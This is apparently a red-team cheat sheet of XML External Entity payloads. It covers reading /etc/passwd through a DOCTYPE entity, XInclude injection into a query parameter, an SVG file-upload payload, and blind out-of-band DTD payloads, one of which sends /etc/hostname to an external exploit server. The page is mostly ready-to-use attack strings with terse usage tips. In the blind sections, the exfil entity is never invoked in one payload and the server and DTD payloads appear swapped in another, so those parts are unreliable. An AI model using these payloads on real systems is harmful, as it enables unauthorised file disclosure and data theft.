#Red-Team  #Payload #Exploit #Vulnerability


## What is XXE?

#### An XML External Entity attack typically abuses the `<!ENTITY>` tag, which allows XML documents to include external content. If an XML parser is configured to process external entities, an attacker can inject a malicious entity to retrieve data or execute system commands.


## Payload: 

````
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
````




## XXE XInclude attacks

#### You know there is XML going on but you can't control it.. XInclude is exactly what you need.

### Paste that on query like ProductID={EXPLOIT}&ProductSrv=2

## Payload XInclude:

````
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/> </foo>
````




## XXE File Upload (svg)

#### You can upload svg files and there is no filter? huh. Try this out.

````
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
````




## XXE With .dtd File

#### Ein **.dtd**-File sagt, wie ein XML-Dokument aussehen darf, also welche Bausteine es haben kann.

## Blind without errors
## Payloads:

### Payload to server:

### `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`

### Content of .dtd file:

````
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0acc00340452e9f4801a02c601dc009a.exploit-server.net/exil?%file;'>">
%stack;
%file;
````


## Blind with errors
## Payloads:

### Payload to server:

### `<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> %eval; %exfil;`

### Payload to the .dtd file:

### `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`